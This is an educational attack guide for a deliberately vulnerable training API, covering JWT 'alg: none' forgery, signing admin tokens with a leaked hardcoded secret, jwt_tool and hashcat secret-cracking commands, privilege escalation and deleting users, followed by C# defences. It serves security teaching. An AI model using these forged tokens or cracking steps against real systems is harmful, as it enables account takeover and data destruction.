# ?? JWT Token Manipulation Attack Guide (Educational)

## ?? WARNING
This guide is for **EDUCATIONAL PURPOSES ONLY**. Never use these techniques on systems you don't own or have explicit permission to test.

---

## ?? Attack Scenarios

### 1?? **Algorithm Confusion Attack (alg: none)**

#### How it works:
JWT signature can be bypassed by changing the algorithm to "none" and removing the signature part.

#### Steps:

1. **Login as a regular user (john):**
```bash
POST /api/auth/login
{
  "username": "john",
  "password": "12345"
}
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIyIiwidW5pcXVlX25hbWUiOiJqb2huIiwicm9sZSI6IlVzZXIifQ.signature",
  "username": "john",
  "isAdmin": false
}
```

2. **Decode the token at [jwt.io](https://jwt.io):**

Header:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload:
```json
{
  "nameid": "2",
  "unique_name": "john",
  "role": "User",
  "nbf": 1739635513,
  "exp": 2071171513,
  "iat": 1739635513,
  "iss": "VulnerableAPI",
  "aud": "VulnerableAPI"
}
```

3. **Modify the token:**
   - Change `"alg": "HS256"` to `"alg": "none"`
   - Change `"role": "User"` to `"role": "Admin"`
   - Remove the signature part (everything after the second dot)

Modified token:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1laWQiOiIyIiwidW5pcXVlX25hbWUiOiJqb2huIiwicm9sZSI6IkFkbWluIn0.
```
(Note: The dot at the end is intentional)

4. **Use the modified token:**
```bash
GET /api/auth/verify
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1laWQiOiIyIiwidW5pcXVlX25hbWUiOiJqb2huIiwicm9sZSI6IkFkbWluIn0.
```

?? **Note:** This attack may not work if signature validation is properly enforced. The vulnerable API must have weak validation.

---

### 2?? **Weak Secret Key Brute Force**

#### How it works:
The secret key is hardcoded and weak: `ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!`

#### Steps:

1. **Get the secret key from the vulnerable endpoint:**
```bash
GET /api/auth/secret-key
```

Response:
```json
{
  "secretKey": "ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!",
  "algorithm": "HS256",
  "warning": "Never expose your secret key in production!"
}
```

2. **Go to [jwt.io](https://jwt.io) and create a new token:**
   - Header:
   ```json
   {
     "alg": "HS256",
     "typ": "JWT"
   }
   ```
   
   - Payload (set yourself as admin):
   ```json
   {
     "nameid": "2",
     "unique_name": "john",
     "role": "Admin",
     "nbf": 1739635513,
     "exp": 2071171513,
     "iat": 1739635513,
     "iss": "VulnerableAPI",
  "aud": "VulnerableAPI"
   }
   ```
   
   - Secret: `ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!`

3. **Copy the generated token and use it:**
```bash
GET /api/user/1
Authorization: Bearer {your_admin_token}
```

Now you have admin privileges! ??

---

### 3?? **Using the Vulnerable Endpoints**

#### A. Decode any token:
```bash
POST /api/auth/decode-token
{
  "token": "your.jwt.token"
}
```

Response shows:
- Header details
- All claims (userId, username, role)
- Signature
- Attack hints

#### B. Generate custom admin token:
```bash
POST /api/auth/generate-token
{
  "userId": 999,
  "username": "hacker",
  "role": "Admin"
}
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "userId": 999,
  "username": "hacker",
  "role": "Admin",
  "warning": "This endpoint should never exist in production!"
}
```

?? **Now you're admin without even having a user account!**

---

## ??? Tools for JWT Attacks

1. **[jwt.io](https://jwt.io)** - Decode, verify, and generate JWT tokens
2. **[jwt_tool](https://github.com/ticarpi/jwt_tool)** - Automated JWT attacks
   ```bash
   python3 jwt_tool.py <token> -C -d dictionary.txt
   ```
3. **Burp Suite** - Intercept and modify tokens
4. **Hashcat** - Brute force JWT secrets
   ```bash
   hashcat -a 0 -m 16500 jwt.txt wordlist.txt
   ```

---

## ?? How to Defend Against These Attacks

### 1. **Strong Secret Keys**
```csharp
// ? BAD
var secretKey = "secret123";

// ? GOOD
var secretKey = Configuration["JWT:SecretKey"]; // Store in secure vault
// Use at least 256 bits of cryptographically random data
```

### 2. **Proper Algorithm Validation**
```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuerSigningKey = true,
    ValidAlgorithms = new[] { SecurityAlgorithms.HmacSha256 }, // Only allow specific algorithms
    // Never allow "none" algorithm
};
```

### 3. **Never Expose Secret Keys**
```csharp
// ? NEVER DO THIS
[HttpGet("secret-key")]
public IActionResult GetSecretKey() { }

// ? NEVER hardcode secrets
var secret = "hardcoded_secret";
```

### 4. **Validate All Claims**
```csharp
// ? Validate token lifetime
ValidateLifetime = true,

// ? Validate issuer and audience
ValidateIssuer = true,
ValidateAudience = true,
```

### 5. **Use Strong Role Checks**
```csharp
// ? Use attribute-based authorization
[Authorize(Roles = "Admin")]
public IActionResult AdminOnly() { }

// ? Double-check in code
if (!User.IsInRole("Admin"))
    return Forbid();
```

---

## ?? Testing Your Attacks

### Test 1: Check if you can access admin endpoints
```bash
# Login as john
POST /api/auth/login {"username": "john", "password": "12345"}

# Try to access admin user
GET /api/user/1
Authorization: Bearer {john_token}

# Expected: You should see admin's data (IDOR vulnerability)
```

### Test 2: Escalate to admin via token manipulation
```bash
# Generate admin token using vulnerable endpoint
POST /api/auth/generate-token
{
  "userId": 2,
  "username": "john",
"role": "Admin"
}

# Use the admin token
GET /api/auth/verify
Authorization: Bearer {admin_token}

# Expected: role = "Admin"
```

### Test 3: Delete any user
```bash
DELETE /api/user/1
Authorization: Bearer {your_admin_token}

# Expected: Admin account deleted!
```

---

## ?? Related OWASP API Security Risks

- **API2:2023** - Broken Authentication
- **API8:2023** - Security Misconfiguration
- **A02:2021** - Cryptographic Failures (OWASP Top 10)

---

## ?? Detection & Prevention

### Logging Suspicious Activity
```csharp
_logger.LogWarning("Token with role {Role} accessed endpoint {Endpoint}", 
    User.FindFirst(ClaimTypes.Role)?.Value, 
    HttpContext.Request.Path);
```

### Rate Limiting
```csharp
// Limit token generation attempts
services.AddRateLimiter(options => {
    options.AddFixedWindowLimiter("auth", opt => {
     opt.Window = TimeSpan.FromMinutes(1);
      opt.PermitLimit = 5;
  });
});
```

---

## ? Quick Attack Checklist

- [ ] Decode token and check claims
- [ ] Try changing algorithm to "none"
- [ ] Get secret key from vulnerable endpoint
- [ ] Generate custom admin token
- [ ] Test IDOR on /api/user/{id}
- [ ] Escalate privileges via mass assignment
- [ ] Delete other users' accounts

---

**Remember:** This is a **deliberately vulnerable** application for learning purposes. Never deploy this in production!
